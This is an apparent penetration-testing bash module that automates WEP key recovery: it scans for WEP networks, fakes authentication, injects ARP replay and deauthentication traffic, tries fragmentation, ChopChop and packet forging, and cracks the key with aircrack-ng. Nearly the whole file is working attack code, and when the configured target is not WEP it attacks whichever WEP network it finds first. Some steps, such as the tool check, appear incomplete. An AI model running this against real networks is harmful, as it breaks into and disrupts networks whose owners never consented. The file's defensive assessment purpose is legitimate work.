#!/usr/bin/env bash
#===============================================================================
#  modules/d2_wep_cracking.sh
#  D2: WEP Network Cracking
#
#  PURPOSE:
#    Detect and attack legacy WEP-encrypted networks. WEP is cryptographically
#    broken but still found on IoT devices, industrial control systems, older
#    hotel/retail WiFi, and embedded systems. Tests include ARP replay, 
#    fragmentation, and ChopChop attacks to recover the WEP key.
#
#  TOOLS: ${TOOL_PATHS[airodump-ng]}, ${TOOL_PATHS[aireplay-ng]}, ${TOOL_PATHS[aircrack-ng]}, ${TOOL_PATHS[packetforge-ng]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs scan data to identify WEP networks)
#
#  EVIDENCE PRODUCED:
#    - d2_wep_scan.txt                (WEP networks detected)
#    - d2_wep_capture*.cap            (IV capture files)
#    - d2_cracked_key.txt             (recovered WEP key)
#    - d2_findings.txt                (analysis summary)
#
#  RESULT JSON FIELDS:
#    - wep_networks_found: int
#    - target_bssid: string
#    - ivs_collected: int
#    - key_cracked: bool
#    - cracked_key: string
#    - attack_method: string (arp_replay|fragmentation|chopchop)
#===============================================================================

run_d2() {
    local total_steps=7
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d2"
#--- Step 1: Verify tools ---
log_step 1 $total_steps "Verifying tools"
update_tc_progress 1 $total_steps "Checking"

local has_aireplay=false
    if [[ -z "${GUEST_SSID:-}" ]]; then
        log_error "Target SSID not set. Run A1 first."
        return 1
    fi

    log_success "Tools verified"

    #--- Step 2: Identify WEP networks ---
    log_step 2 $total_steps "Scanning for WEP-encrypted networks"
    update_tc_progress 2 $total_steps "WEP scan"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    local wep_scan_file="${evidence_prefix}_wep_scan.txt"
    local findings_file="${evidence_prefix}_findings.txt"

    {
        echo "============================================================"
        echo "  D2: WEP Network Cracking"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    # Scan for WEP networks
    local scan_prefix="/tmp/d2_scan"
    rm -f "${scan_prefix}"* 2>/dev/null

    log_cmd "${TOOL_PATHS[airodump-ng]} --encrypt WEP --write ${scan_prefix} --output-format csv ${mon_iface}"
    timeout 30 ${TOOL_PATHS[airodump-ng]} --encrypt WEP \
        --write "$scan_prefix" \
        --output-format csv \
        "$mon_iface" &>/dev/null || true

    local wep_networks_found=0
    local target_bssid=""
    local target_channel=""
    local target_ssid=""

    if [[ -f "${scan_prefix}-01.csv" ]]; then
        # Parse WEP networks from CSV
        local wep_lines
        local wep_lines=$(grep "WEP" "${scan_prefix}-01.csv" 2>/dev/null | head -20 || true)

        if [[ -n "$wep_lines" ]]; then
            local wep_networks_found=$(echo "$wep_lines" | wc -l)

            {
                echo "============================================================"
                echo "  WEP Networks Detected"
                echo "============================================================"
                echo ""
                echo "$wep_lines"
            } > "$wep_scan_file"

            log_result "FINDING" "${wep_networks_found} WEP network(s) detected!"
            echo "FINDING: ${wep_networks_found} WEP networks found" >> "$findings_file"

            # Check if target SSID uses WEP
            local target_line
            local target_line=$(echo "$wep_lines" | grep -i "${GUEST_SSID}" | head -1 || true)

            if [[ -n "$target_line" ]]; then
                local target_bssid=$(echo "$target_line" | awk -F, '{print $1}' | xargs)
                local target_channel=$(echo "$target_line" | awk -F, '{print $4}' | xargs)
                local target_ssid="$GUEST_SSID"
                log_info "Target ${GUEST_SSID} uses WEP!"
            else
                # Use first WEP network found
                local target_bssid=$(echo "$wep_lines" | head -1 | awk -F, '{print $1}' | xargs)
                local target_channel=$(echo "$wep_lines" | head -1 | awk -F, '{print $4}' | xargs)
                local target_ssid=$(echo "$wep_lines" | head -1 | awk -F, '{print $14}' | xargs)
                log_info "Target SSID not WEP. Using: ${target_ssid} (${target_bssid})"
            fi
        fi
    fi
    rm -f "${scan_prefix}"* 2>/dev/null

    if [[ $wep_networks_found -eq 0 ]]; then
        log_info "No WEP networks found in range"
        echo "INFO: No WEP networks detected" >> "$findings_file"

        disable_monitor_mode
        sleep 3

        local result_json
        evidence_register_file "d2_findings.txt"

        evidence_register_file "d2_wep_scan.txt"
        evidence_register_file "d2_wep_capture.cap"
        evidence_register_file "d2_cracked_key.txt"
        evidence_register_file "d2_findings.txt"

        local result_json=$(${TOOL_PATHS[jq]} -n \
            --arg status "SECURE" \
            --arg summary "No WEP-encrypted networks detected in range. All networks use WPA2 or stronger encryption." \
            --arg recommendations "No action needed. Continue avoiding WEP deployment." \
            '{status: $status, summary: $summary, recommendations: $recommendations, wep_networks_found: 0, key_cracked: false, }')
        save_tc_result "D2" "$result_json"

        echo ""
        log_result "SECURE" "No WEP networks found — all networks use modern encryption"
        return 0
    fi

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ WEP CRACKING ATTACK ★                                        ║"
    echo "  ║                                                                    ║"
    echo "  ║  Target: ${target_ssid} (${target_bssid}) CH ${target_channel}    "
    echo "  ║                                                                    ║"
    echo "  ║  WEP is cryptographically broken. This test will:                 ║"
    echo "  ║    • Capture IVs via ARP replay injection                         ║"
    echo "  ║    • Attempt fragmentation / ChopChop if needed                   ║"
    echo "  ║    • Recover the WEP key with ${TOOL_PATHS[aircrack-ng]}                         ║"
    echo "  ║                                                                    ║"
    echo "  ║  This generates significant traffic on the target network.       ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with WEP cracking? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && { disable_monitor_mode; return 1; }

    local ivs_collected=0
    local key_cracked="false"
    local cracked_key=""
    local attack_method="arp_replay"

    check_abort || return 1

    #--- Step 3: Set channel and fake authentication ---
    log_step 3 $total_steps "Authenticating to target AP"
    update_tc_progress 3 $total_steps "Fake auth"

    iw dev "$mon_iface" set channel "$target_channel" 2>/dev/null || true

    # Fake authentication to associate with the AP
    log_cmd "${TOOL_PATHS[aireplay-ng]} --fakeauth 0 -a ${target_bssid} ${mon_iface}"
    ${TOOL_PATHS[aireplay-ng]} --fakeauth 0 \
        -a "$target_bssid" \
        "$mon_iface" &>/dev/null || true

    sleep 2

    #--- Step 4: Capture IVs + ARP replay ---
    log_step 4 $total_steps "Collecting IVs via ARP replay injection"
    update_tc_progress 4 $total_steps "IV collection"

    local capture_prefix="${evidence_prefix}_wep_capture"
    rm -f "${capture_prefix}"* 2>/dev/null

    # Start airodump to capture IVs
    ${TOOL_PATHS[airodump-ng]} --bssid "$target_bssid" \
        --channel "$target_channel" \
        --write "$capture_prefix" \
        --output-format pcap \
        "$mon_iface" &>/dev/null &
    local dump_pid=$!
    register_cleanup "kill -SIGINT $dump_pid 2>/dev/null || true; wait $dump_pid 2>/dev/null || true"

    sleep 3

    # ARP replay attack — generates IVs rapidly
    log_cmd "${TOOL_PATHS[aireplay-ng]} --arpreplay -b ${target_bssid} ${mon_iface}"
    ${TOOL_PATHS[aireplay-ng]} --arpreplay \
        -b "$target_bssid" \
        "$mon_iface" &>/dev/null &
    local replay_pid=$!
    register_cleanup "kill -TERM $replay_pid 2>/dev/null || true; sleep 0.5; kill -9 $replay_pid 2>/dev/null || true; wait $replay_pid 2>/dev/null || true"

    # Also try interactive packet replay to stimulate ARP
    ${TOOL_PATHS[aireplay-ng]} --deauth 3 -a "$target_bssid" "$mon_iface" &>/dev/null || true

    start_countdown 120 "Collecting IVs via ARP replay (need ~20,000+ for crack)"
    sleep 120
    stop_countdown

    # Stop replay and capture
    kill -TERM $replay_pid 2>/dev/null; wait $replay_pid 2>/dev/null
    kill -SIGINT $dump_pid 2>/dev/null; wait $dump_pid 2>/dev/null

    # Count IVs collected
    local cap_file
    local cap_file=$(ls "${capture_prefix}"*.cap 2>/dev/null | head -1)
    if [[ -n "$cap_file" && -s "$cap_file" ]]; then
        local ivs_collected=$(${TOOL_PATHS[aircrack-ng]} "$cap_file" 2>&1 | grep -oP '\d+ IVs' | grep -oP '\d+' | head -1) || true
        local ivs_collected=${ivs_collected:-0}
        log_info "Collected ${ivs_collected} IVs"
    fi

    check_abort || return 1

    #--- Step 5: Attempt fragmentation if low IVs ---
    log_step 5 $total_steps "Fragmentation/ChopChop attack (if needed)"
    update_tc_progress 5 $total_steps "Fragmentation"

    if [[ ${ivs_collected:-0} -lt 5000 ]]; then
        log_info "Low IV count (${ivs_collected}) — attempting fragmentation attack..."
        local attack_method="fragmentation"

        # Fragmentation attack to get a PRGA keystream
        local prga_file="/tmp/d2_prga.xor"
        timeout 60 ${TOOL_PATHS[aireplay-ng]} --fragment \
            -b "$target_bssid" \
            "$mon_iface" \
            -o "$prga_file" \
            &>/dev/null || true

        if [[ ! -f "$prga_file" ]]; then
            log_info "Fragmentation failed — trying ChopChop..."
            local attack_method="chopchop"
            timeout 60 ${TOOL_PATHS[aireplay-ng]} --chopchop \
                -b "$target_bssid" \
                "$mon_iface" \
                &>/dev/null || true
        fi

        # If we got a keystream, forge ARP packets to generate IVs
        if [[ -f "$prga_file" ]]; then
            log_info "Got keystream — forging ARP packets..."
            command -v packetforge-ng &>/dev/null && \
                ${TOOL_PATHS[packetforge-ng]} -0 -a "$target_bssid" \
                    -h "$(${TOOL_PATHS[ip]} link show "$mon_iface" | awk '/ether/{print $2}')" \
                    -l 255.255.255.255 -k 255.255.255.255 \
                    -y "$prga_file" \
                    -w /tmp/d2_arp.cap &>/dev/null || true
        fi
        rm -f "$prga_file" /tmp/d2_arp.cap
    fi

    #--- Step 6: Crack the WEP key ---
    log_step 6 $total_steps "Cracking WEP key with ${TOOL_PATHS[aircrack-ng]}"
    update_tc_progress 6 $total_steps "Cracking"

    local cracked_file="${evidence_prefix}_cracked_key.txt"

    if [[ -n "$cap_file" && -s "$cap_file" ]]; then
        log_cmd "${TOOL_PATHS[aircrack-ng]} -b ${target_bssid} ${cap_file}"

        local crack_output
        local crack_output=$(timeout 120 ${TOOL_PATHS[aircrack-ng]} \
            -b "$target_bssid" \
            "$cap_file" 2>&1 || true)

        echo "$crack_output" >> "$findings_file"

        # Check for cracked key
        local found_key
        local found_key=$(echo "$crack_output" | grep -i "KEY FOUND" | grep -oP '\[.*?\]' | tr -d '[]' || true)

        if [[ -n "$found_key" ]]; then
            local key_cracked="true"
            local cracked_key="$found_key"
            echo "$cracked_key" > "$cracked_file"
            log_result "CRITICAL" "★ WEP KEY CRACKED: ${cracked_key}"
            echo "CRITICAL: WEP key recovered: ${cracked_key}" >> "$findings_file"
        else
            log_info "Key not cracked — may need more IVs (collected: ${ivs_collected})"
            echo "INFO: Key not cracked with ${ivs_collected} IVs" >> "$findings_file"
        fi
    fi

    # Restore managed mode
    disable_monitor_mode
    sleep 3

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local result_status="FINDING"
    local result_summary=""
    local recommendations=""

    if [[ "$key_cracked" == "true" ]]; then
        local result_summary="CRITICAL: WEP key recovered (${cracked_key}) for ${target_ssid} using ${attack_method}. WEP is cryptographically broken and provides no security."
        local recommendations="1) IMMEDIATELY migrate from WEP to WPA2 or WPA3. "
        recommendations+="2) WEP provides zero effective encryption — treat as an open network. "
        recommendations+="3) Inventory all WEP devices and plan replacement/upgrade. "
        recommendations+="4) For IoT devices that only support WEP, isolate them on a dedicated VLAN with strict firewall rules."
    elif [[ $wep_networks_found -gt 0 ]]; then
        local result_summary="${wep_networks_found} WEP network(s) detected. Key not cracked in test window but WEP is trivially breakable given more time."
        local recommendations="1) Migrate ALL WEP networks to WPA2/WPA3 immediately. "
        recommendations+="2) WEP can be cracked in minutes with sufficient traffic. "
        recommendations+="3) The presence of WEP indicates legacy equipment needing replacement."
    fi

    local result_json
    local result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "WEP networks: ${wep_networks_found}, Target: ${target_bssid:-none}, IVs: ${ivs_collected}, Cracked: ${key_cracked}, Method: ${attack_method}" \
        --arg recommendations "$recommendations" \
        --argjson wep_networks_found "$wep_networks_found" \
        --arg target_bssid "${target_bssid:-none}" \
        --argjson ivs_collected "${ivs_collected:-0}" \
        --arg key_cracked "$key_cracked" \
        --arg cracked_key "$cracked_key" \
        --arg attack_method "$attack_method" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            wep_networks_found: $wep_networks_found,
            target_bssid: $target_bssid,
            ivs_collected: $ivs_collected,
            key_cracked: ($key_cracked == "true"),
            cracked_key: $cracked_key,
            attack_method: $attack_method,
        }')

    save_tc_result "D2" "$result_json"

    echo ""
    if [[ "$key_cracked" == "true" ]]; then
        log_result "CRITICAL" "★ WEP KEY CRACKED: ${cracked_key} (${attack_method})"
    elif [[ $wep_networks_found -gt 0 ]]; then
        log_result "FINDING" "${wep_networks_found} WEP network(s) detected — trivially breakable"
    fi

    return 0
}
